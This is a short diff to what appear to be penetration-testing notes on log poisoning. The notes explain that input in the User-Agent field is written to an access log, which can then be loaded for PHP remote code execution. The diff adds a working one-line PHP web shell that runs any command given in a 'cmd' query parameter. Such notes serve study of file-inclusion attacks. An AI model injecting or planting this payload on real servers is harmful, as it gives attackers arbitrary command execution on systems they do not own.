@@ -7,3 +7,5 @@ for e.g.:
 we are able to log user input in access log in user-agent field.
 
 we can add php rce in it and try to load file
+<?php echo system($_GET['cmd']); ?>
+
